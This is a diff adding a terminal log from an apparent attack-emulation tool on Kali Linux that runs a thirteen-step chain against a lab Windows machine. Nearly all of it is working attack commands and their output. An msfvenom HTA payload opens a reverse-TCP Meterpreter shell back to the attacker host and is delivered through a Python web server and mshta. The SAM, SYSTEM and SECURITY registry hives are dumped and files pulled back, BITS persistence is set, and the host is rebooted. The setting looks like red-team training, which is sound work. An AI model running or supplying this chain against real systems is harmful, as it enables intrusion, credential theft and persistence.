@@ -1,0 +1,343 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260715T033506Z-78114f34/chain-008]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[MSFVenom Console] Step 1
+
+📌[Name] Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacker machine
+➤ Enter value for LPORT (current: 4444 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.hta' , required: True): 
+
+[MSFVenom] Command to run:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.43 LPORT=4444 -f hta-psh -o /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.hta
+Run this MSFVenom command? [y/n] (y): 
+[MSFVenom] Running... (may take 5-10s)
+✓ MSFVenom payload generated successfully
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_mp.hta' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the file on the attacker's machine                          │
+│ 3. Download the file to C:\Users\Public\chain_mp.hta                                   │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Metasploit Executor] Step 3
+
+📌[Name] Set an MSF payload handler for a file-backed payload
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: False): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: False): 
+ Parameter Input
+  Parameter: payload_name
+  Description: payload type set by msf
+➤ Enter value for payload_name (current: 'windows/meterpreter/reverse_tcp' , required: False): 
+[*] Executing exploit=exploit/multi/handler payload=windows/meterpreter/reverse_tcp
+[+] Handler active — job 30: Exploit: multi/handler
+✓ Handler active — job 30, awaiting callback
+No active sessions found after 20s.
+
+📌[Human] Step 4
+
+📌[Name] Simulate the victim execute an HTA file on its machine
+ Parameter Input
+  Parameter: HTA_PATH
+  Description: Saved path of the HTA file on the victim machine
+  ✓ Using stored value: C:\Users\Public\chain_mp.hta
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, use PowerShell or Command Prompt, or the Run dialog)             │
+│ mshta.exe C:\Users\Public\chain_mp.hta                                                 │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 5
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+⚠ No new meterpreter session after 30s.
+➤ Retry polling? [r=retry / n=stop and print summary] (r): r
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [140] meterpreter — kali (192.168.56.65:49888)
+➤ Session id to accept (default: 140, or 'n' to abort chain): 
+
+📌[Meterpreter Executor] Step 6
+
+📌[Name] Get Current Process ID
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[140] WIN-BASE\useradmin @ WIN-BASE
+Select session ID: 140
+Set the default session id as: 140!
+Selected meterpreter session: 140
+
+[Meterpreter Executor] Executing: getpid
+Keep going with the next attack step? [y/n] (y): 
+Current pid: 5232
+
+
+📌[Human] Step 7
+
+📌[Name] Simulate the victim execute an HTA file on its machine as Admin
+ Parameter Input
+  Parameter: HTA_PATH
+  Description: Saved path of the HTA file on the victim machine
+  ✓ Using stored value: C:\Users\Public\chain_mp.hta
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, open an ELEVATED PowerShell or Command Prompt)                   │
+│ mshta.exe C:\Users\Public\chain_mp.hta                                                 │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 8
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: ['140']
+  Newly detected session(s):
+    [141] meterpreter — WIN-BASE\useradmin @ WIN-BASE (192.168.56.65:49889)
+➤ Session id to accept (default: 141, or 'n' to abort chain): 
+
+📌[Meterpreter Session Derive] Step 9
+📌[Name] Execute System Command
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[140] WIN-BASE\useradmin @ WIN-BASE
+[141] WIN-BASE\useradmin @ WIN-BASE
+Select session ID: 141
+Set the default session id as: 141!
+Selected meterpreter session: 141
+  ↳ Derived executor_derived executor from Meterpreter session 141
+
+📌[Command Prompt Executor] Step 10
+
+📌[Name] Registry dump of SAM, creds, and secrets
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke reg save.
+  ✓ Using stored value: 141
+ Parameter Input
+  Parameter: save_dir
+  Description: Directory on the target where the SAM / SYSTEM / SECURITY hives are written.
+➤ Enter value for save_dir (current: 'C:\\Users\\Public' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  reg save HKLM\sam C:\Users\Public\sam
+reg save HKLM\system C:\Users\Public\system
+reg save HKLM\security C:\Users\Public\security
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: reg save HKLM\sam C:\Users\Public\sam
+Output:
+The operation completed successfully.
+
+Executing: reg save HKLM\system C:\Users\Public\system
+Output:
+The operation completed successfully.
+
+Executing: reg save HKLM\security C:\Users\Public\security
+Output:
+The operation completed successfully.
+
+
+📌[Meterpreter Executor] Step 11
+
+📌[Name] File Download Operation
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  ✓ Using stored value: 140
+ Parameter Input
+  Parameter: remote_path
+  Description: Full path to remote file/directory
+➤ Enter value for remote_path (current: 'C:\\Users\\Public' , required: True): 
+ Parameter Input
+  Parameter: output_dir
+  Description: Local directory to save files
+➤ Enter value for output_dir (current: '/tmp' , required: True): 
+
+[Meterpreter Executor] Executing: download
+Keep going with the next attack step? [y/n] (y): 
+[*] mirroring  : C:\Users\Public\AccountPictures -> /tmp/AccountPictures
+[*] downloading: C:\Users\Public\AccountPictures\desktop.ini -> /tmp/AccountPictures/desktop.ini
+[*] Completed  : C:\Users\Public\AccountPictures\desktop.ini -> /tmp/AccountPictures/desktop.ini
+[*] mirrored   : C:\Users\Public\AccountPictures -> /tmp/AccountPictures
+[*] downloading: C:\Users\Public\bits_download.dat -> /tmp/bits_download.dat
+
+
+📌[Command Prompt Executor] Step 12
+
+📌[Name] Persist, Download, & Execute
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke bitsadmin.
+  ✓ Using stored value: 141
+ Parameter Input
+  Parameter: bits_job_name
+  Description: BITS job name.
+➤ Enter value for bits_job_name (current: 'AuroraChainBITS' , required: True): 
+ Parameter Input
+  Parameter: remote_file
+  Description: URL of a file for BITS to download (payload delivery vehicle).
+➤ Enter value for remote_file (current: 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md' , required: True): 
+ Parameter Input
+  Parameter: local_file
+  Description: Target-side destination for the BITS download.
+➤ Enter value for local_file (current: 'C:\\Users\\Public\\bits_download.dat' , required: True): 
+ Parameter Input
+  Parameter: command_path
+  Description: Command invoked via `/setnotifycmdline` on BITS state change.
+➤ Enter value for command_path (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  bitsadmin.exe /create "AuroraChainBITS"
+bitsadmin.exe /addfile "AuroraChainBITS" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md" 
+"C:\Users\Public\bits_download.dat"
+bitsadmin.exe /setnotifycmdline "AuroraChainBITS" "C:\Windows\System32\notepad.exe" NULL
+bitsadmin.exe /resume "AuroraChainBITS"
+ping -n 5 127.0.0.1 >nul 2>&1
+bitsadmin.exe /complete "AuroraChainBITS"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: bitsadmin.exe /create "AuroraChainBITS"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Created job {6EA12306-4479-4010-AD4F-49E9A64BD9D4}.
+
+Executing: bitsadmin.exe /addfile "AuroraChainBITS" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md" "C:\Users\Public\bits_download.dat"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Added https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -> C:\Users\Public\bits_download.dat to job.
+
+Executing: bitsadmin.exe /setnotifycmdline "AuroraChainBITS" "C:\Windows\System32\notepad.exe" NULL
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+notification command line set to 'C:\Windows\System32\notepad.exe' 'NULL'.
+
+Executing: bitsadmin.exe /resume "AuroraChainBITS"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Job resumed.
+
+Executing: ping -n 5 127.0.0.1 >nul 2>&1
+Output: (empty)
+
+Executing: bitsadmin.exe /complete "AuroraChainBITS"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Job completed.
+
+
+📌[Command Prompt Executor] Step 13
+
+📌[Name] Restart System - Windows
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke shutdown.
+  ✓ Using stored value: 141
+ Parameter Input
+  Parameter: timeout
+  Description: Seconds until the reboot fires.
+➤ Enter value for timeout (current: 60 , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  shutdown /r /t 60
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: shutdown /r /t 60
+Output: (empty)
+
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                                  Start                    End                      Duration  Status
+   1  Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using    2026-07-17 21:26:42 UTC  2026-07-17 21:26:48 UTC      6.1s    ✓   
+      MSFVenom                                                                                                                                                
+   2  Simulate the victim download a file on its machine                                    2026-07-17 21:26:48 UTC  2026-07-17 21:26:54 UTC      5.8s    ✓   
+   3  Set an MSF payload handler for a file-backed payload                                  2026-07-17 21:26:54 UTC  2026-07-17 21:27:23 UTC     29.2s    ✓   
+   4  Simulate the victim execute an HTA file on its machine                                2026-07-17 21:27:23 UTC  2026-07-17 21:28:38 UTC    1m 15s    ✓   
+   5  Execute a Meterpreter Payload                                                         2026-07-17 21:28:38 UTC  2026-07-17 21:29:19 UTC     40.9s    ✓   
+   6  Get Current Process ID                                                                2026-07-17 21:29:19 UTC  2026-07-17 21:29:23 UTC      4.1s    ✓   
+   7  Simulate the victim execute an HTA file on its machine as Admin                       2026-07-17 21:29:23 UTC  2026-07-17 21:29:55 UTC     31.7s    ✓   
+   8  Execute a Meterpreter Payload                                                         2026-07-17 21:29:55 UTC  2026-07-17 21:29:57 UTC      1.8s    ✓   
+   9  Execute System Command                                                                2026-07-17 21:29:57 UTC  2026-07-17 21:29:59 UTC      2.1s    ✓   
+  10  Registry dump of SAM, creds, and secrets                                              2026-07-17 21:29:59 UTC  2026-07-17 21:30:06 UTC      6.8s    ✓   
+  11  File Download Operation                                                               2026-07-17 21:30:06 UTC  2026-07-17 21:30:12 UTC      5.9s    ✓   
+  12  Persist, Download, & Execute                                                          2026-07-17 21:30:12 UTC  2026-07-17 21:30:32 UTC     20.1s    ✓   
+  13  Restart System - Windows                                                              2026-07-17 21:30:32 UTC  2026-07-17 21:30:44 UTC     11.8s    ✓   
+
+  Total: 13 steps executed (13 ✓, 0 ?, 0 ✗) in 4m 2s
+══════════════════════════════════════════════════════════════════════
